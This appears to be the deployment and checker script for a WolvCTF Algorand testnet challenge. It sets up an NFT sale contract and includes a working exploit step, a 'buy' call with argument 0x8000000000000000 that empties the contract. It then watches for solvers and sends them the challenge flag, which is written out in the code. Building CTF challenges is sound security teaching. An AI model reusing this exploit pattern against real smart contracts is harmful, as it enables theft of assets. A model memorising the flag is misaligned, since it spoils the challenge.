import algosdk from 'algosdk';
import * as fs from 'fs/promises';
import {
    ALGOSMSV0_MESSAGE,
    ALGOSMSV0_TYPE_MSG,
    sendAlgoSMS,
  } from 'algosms'


let maxAssets = 100;
let maxAssetTxns = 100;

const ALGONODE_TOKEN = 'no token required';
const ALGONODE_SERVER = 'https://testnet-api.algonode.cloud';
const ALGONODE_PORT = '443';

const client = new algosdk.Algodv2(
  ALGONODE_TOKEN,
  ALGONODE_SERVER,
  ALGONODE_PORT
);

let indexerClient = new algosdk.Indexer({}, "https://testnet-idx.algonode.cloud", "443")

let applicationId: number
let applicationAddress: string
let private_key: Uint8Array
let public_address: string

let getInfo = async () => {
    let public_info = fs.readFile("public_info.json", "utf8")
    let public_info_json = JSON.parse(await public_info)
    applicationId = Number(public_info_json["AppID"])
    applicationAddress = algosdk.getApplicationAddress(applicationId)
    public_address = public_info_json["CTF_Address"]

    let private_info = fs.readFile("private_info.json", "utf8")
    let private_info_json = JSON.parse(await private_info)
    private_key = new Uint8Array(private_info_json["CTF_PrivateKey"].split(',').map(function(item) {
        return parseInt(item, 10);
    }));
}

let postTransaction = async (txns: algosdk.Transaction[], client: algosdk.Algodv2) => {
    //const connector = getConnector();
    algosdk.assignGroupID(txns);
    let txIds = txns.map(txn => {return txn.txID.toString()})

    const decodedResult = txns.map(txn => {
        return txn.signTxn(private_key);
    });
    decodedResult.forEach((dR, i) => { 
        const signedTxn = algosdk.decodeSignedTransaction(dR!)
        const s_txn = (signedTxn.txn as unknown) as algosdk.Transaction;
        txIds[i] = s_txn.txID();
    });
    
    
    const acTx = await client.sendRawTransaction(decodedResult).do();

    // Wait for transaction to be confirmed
    let confirmedTxn = await algosdk.waitForConfirmation(client, acTx.txId, 4);
    //Get the completed Transaction
    console.log("Transaction " + acTx.txId + " confirmed in round " + confirmedTxn["confirmed-round"]);
    
    // display results for loop for prommise where !order_matter
    let id = -1;

    await Promise.all(txIds.map(async (txId) => {
        let transactionResponse = await client.pendingTransactionInformation(txId).do();
        if (transactionResponse['application-index'] != null)
        {
            id = transactionResponse['application-index'];
        }
        if (transactionResponse["asset-index"] != null) {
            id = transactionResponse["asset-index"];
        }
    }));
    return {txid: acTx.txId, id: id}
}

let deploy = async() => {
    await getInfo()
    console.log("Testing contract:")

    let params = await client.getTransactionParams().do();

    // OptIn
    try { 
        const optInTx = algosdk.makeApplicationCallTxnFromObject({
            from: public_address,
            appIndex: applicationId,
            onComplete: algosdk.OnApplicationComplete.OptInOC,
            appArgs:  [],
            foreignApps: [],
            foreignAssets: [],
            suggestedParams: params,
        })
        console.log("Opting In To Application...")
        await postTransaction([optInTx], client)
    }
    catch {
        console.log("Already opted in")
    }

    // Create NFT
    console.log("Creating NFT...")
    const nftTxn = algosdk.makeAssetCreateTxnWithSuggestedParams(public_address, undefined, 1, undefined, undefined, undefined, undefined, undefined, undefined, undefined, undefined, undefined, undefined, params)
    let tx_result2 = await postTransaction([nftTxn], client)
    let nftID = tx_result2.id
    console.log("NFT created with id:", nftID)

    // Setup Contract
    console.log("Funding contract...")
    let transactions: algosdk.Transaction[] = []
    const fundAppTxn = algosdk.makePaymentTxnWithSuggestedParams(public_address, applicationAddress, 1000000, undefined, undefined, params)    
    
    const setupTxn = algosdk.makeApplicationCallTxnFromObject({
        from: public_address,
        appIndex: applicationId,
        onComplete: algosdk.OnApplicationComplete.NoOpOC,
        appArgs:  [new TextEncoder().encode("setup"), algosdk.bigIntToBytes(Date.now() + 1 * 24 * 60 * 60 * 1000, 8),],
        foreignApps: [nftID],
        foreignAssets: [nftID],
        suggestedParams: params,
    })

    const xferNFTTxn = algosdk.makeAssetTransferTxnWithSuggestedParams(public_address, applicationAddress, undefined, undefined, 1, undefined, nftID, params, undefined )
    transactions.push(...[fundAppTxn, setupTxn, xferNFTTxn])
    
    await postTransaction(transactions, client)
    
    console.log("Exploiting Contract...")
    const fakePurchase = algosdk.makePaymentTxnWithSuggestedParams(public_address, applicationAddress, 1000000, undefined, undefined, params)    
    const updateTxn = algosdk.makeApplicationCallTxnFromObject({
        from: public_address,
        appIndex: applicationId,
        onComplete: algosdk.OnApplicationComplete.NoOpOC,
        appArgs: [new TextEncoder().encode("buy"), algosdk.bigIntToBytes(0x8000000000000000, 8)],
        foreignApps: [nftID],
        foreignAssets: [nftID],
        suggestedParams: params,
    })
    await postTransaction([fakePurchase, updateTxn], client)

    console.log("Validating exploit...")
    let response = await indexerClient.lookupAccountAssets(applicationAddress).do();
    console.log(response)
    if (response.assets.length == 0) {
        console.log("Exploit successful!")
    } else {
        console.log("Exploit failed!")
    }
    console.log("Contract state:")
    console.log(JSON.stringify(response, undefined, 2));

    let old_balance = (await client.accountInformation(public_address).do()).amount;
    // Get last round
    let last_round = (await indexerClient.searchForTransactions().address(public_address).do()).transactions[0]['confirmed-round'];
    console.log("Last Round:", last_round)
    while(true) {
        // Check for all transactions since last timestamp
        let new_balance = old_balance;
        let transactions = null;
        try {
            new_balance = (await client.accountInformation(public_address).do()).amount;
            transactions = await indexerClient.searchForTransactions().address(public_address).do();
        }
        catch {
            console.log("Error getting transactions")
            continue;
        }
        let new_round = transactions.transactions[0]['confirmed-round'];
        if(old_balance !== new_balance && new_round !== last_round) {
            // Get the last account to send money to us
            // Filter for all submissions since the last round
            let submissions = transactions.transactions.filter((txn) => {
                return txn['confirmed-round'] > last_round && txn['tx-type'] === 'pay' && txn['payment-transaction']['receiver'] === public_address;
            });

            console.log("New Submissions:", submissions)
            
            for (let i = 0; i < submissions.length; i++) {
                let submission = submissions[i];
                if (submission["payment-transaction"]["amount"] < submission["fee"]) {
                    continue;
                }
                // Check their assets
                let lastTxnAssets = null;
                try {
                    lastTxnAssets = await indexerClient.lookupAccountAssets(submission["sender"]).do();
                    // filter out assets that the sender doesn't own
                    lastTxnAssets.assets = lastTxnAssets.assets.filter((asset) => {
                        return asset["amount"] > 0;
                    });
                }
                catch {
                    console.log("Error getting assets")
                    continue;
                }

                // Check if any of the assets have been in the contract
                let found = false;
                let sender = submission["sender"];
                for (let i = 0; i < Math.min(lastTxnAssets.assets.length, maxAssets); i++) {
                    // Get the txn history of the asset
                    let assetTxns = null;
                    try {
                        assetTxns = await indexerClient.searchForTransactions().assetID(lastTxnAssets.assets[i]["asset-id"]).do();
                    } catch {
                        console.log("Error getting asset txns")
                        break;
                    }
                    for (let j = 0; j < Math.min(assetTxns.transactions.length, maxAssetTxns); j++) {
                        if ("asset-transfer-transaction" in assetTxns.transactions[j]) {
                            if (assetTxns.transactions[j]["asset-transfer-transaction"]["receiver"] == applicationAddress) {
                                found = true;
                                break;
                            }
                        }
                    }
                    if (found) {
                        break;
                    } 
                }
                if (found && sender.length > 0) {
                    const message: ALGOSMSV0_MESSAGE = {
                        t: ALGOSMSV0_TYPE_MSG,
                        msg: 'wctf{1_h0p3_y0u_d0nt_4cc1dent4lly_4get_t0_r3m0ve_th3_4pp}',
                        from: 'WolvSec',
                        uri: 'https://wolvctf.io/',
                        ref: 'ARC-0015',
                    };
                    try {
                        await sendAlgoSMS(client, message, sender, {addr: public_address, sk: private_key});
                    } catch (e) {
                        console.log("Error sending SMS:", e);
                    }            
                }
            }
            old_balance = new_balance;
            last_round = new_round;
            // Check if the last payment can cover the fee
        }
        await new Promise(r => setTimeout(r, 100));
    }
}

deploy()
